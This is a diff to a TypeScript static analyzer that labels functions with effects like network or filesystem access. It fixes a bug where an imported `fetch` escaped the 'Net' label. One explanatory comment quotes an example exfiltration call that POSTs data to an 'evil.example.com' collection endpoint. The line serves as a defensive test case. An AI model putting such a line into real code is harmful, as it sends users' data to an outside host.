@@ -5115,9 +5115,50 @@ function visitCalls(node) {
     else if (ts.isIdentifier(callee) && importedFromNetPkg(callee))
       geff = "Net"; // a bare call to an HTTP-client default/named import (installed → sig resolves here) — #13
 
-    else if (ts.isIdentifier(callee) && callee.text === "fetch"
-             && !(checker.getSymbolAtLocation(callee)?.declarations ?? [])
-                  .some((d) => projectFiles.has(path.resolve(d.getSourceFile().fileName))))
+    // …AND `fetch` REACHED THROUGH AN IMPORT, which this guard was treating as the project's own.
+    //
+    // The guard asks "is this fetch declared in a project file?", so a project's own `fetch` never
+    // fabricates Net. For `import { fetch } from "node-fetch-native/proxy"` the symbol's declaration is
+    // the IMPORT SPECIFIER — which lives in the importing file, a project file — so the guard said yes
+    // and withheld Net. Declared-in-a-project-file is not DEFINED-BY-the-project.
+    //
+    // MEASURED, and the shape is a MONOTONICITY VIOLATION:
+    //     without node_modules → `exfil` reports Unknown        (honest — the import did not resolve)
+    //     WITH node_modules    → `exfil` reports NOTHING, pure  (silent)
+    // Installing dependencies gives the analyzer MORE information and produced a LESS safe answer, and
+    // `deny Net` certified `await fetch("https://evil.example.com/collect", {method:"POST", body:data})`.
+    // Found on REAL code: giget's `_utils.download`, a function whose whole job is an HTTP download,
+    // reported `['Fs']` alone with its 474 packages installed.
+    //
+    // Resolve THROUGH the alias: the aliased symbol's declaration says whether the project defines this,
+    // and its NAME says whether it is `fetch` — so a renamed `import { fetch as nfn }` is caught too,
+    // where the callee text is `nfn`. `import { fetch } from "./my-mock"` still lands in a project file
+    // and still charges nothing.
+    else if (ts.isIdentifier(callee) && (() => {
+      const sym0 = checker.getSymbolAtLocation(callee);
+      if (!sym0) return false;
+      // WHERE DID IT COME FROM? The module SPECIFIER decides, not file-set membership. A RELATIVE
+      // import is the project's own module by definition; a BARE specifier is a package. Keying on
+      // `projectFiles` instead was wrong and the control caught it: scanning a single FILE leaves a
+      // sibling `./mock` outside the analyzed set, so a project's own mock fabricated Net. The
+      // specifier is the same thing κ classifies on, and it does not move with the scan's shape.
+      for (const d of sym0.declarations ?? []) {
+        const imp = ts.isImportSpecifier(d) ? d.parent?.parent?.parent
+                  : ts.isImportClause(d) ? d.parent
+                  : ts.isNamespaceImport(d) ? d.parent?.parent : null;
+        const spec = imp && ts.isImportDeclaration(imp) ? imp.moduleSpecifier : null;
+        if (spec && ts.isStringLiteralLike(spec)) {
+          if (spec.text.startsWith(".") || spec.text.startsWith("/")) return false;   // the project's own
+          // A bare specifier: this is somebody's `fetch` implementation, not ours.
+          let t = sym0;
+          if (t.flags & ts.SymbolFlags.Alias) { try { t = checker.getAliasedSymbol(t); } catch { /* unresolved */ } }
+          return (t?.getName?.() ?? callee.text) === "fetch";
+        }
+      }
+      // Not an import at all: the ambient global, unless the project declares its own.
+      if (callee.text !== "fetch") return false;
+      return !(sym0.declarations ?? []).some((d) => projectFiles.has(path.resolve(d.getSourceFile().fileName)));
+    })())
       geff = "Net";
     // the fully-qualified global fetch — `globalThis.fetch`/`window.fetch`/`self.fetch` — is a
     // PropertyAccess callee the bare-identifier guard above misses, so it read silent-pure. Mirror the
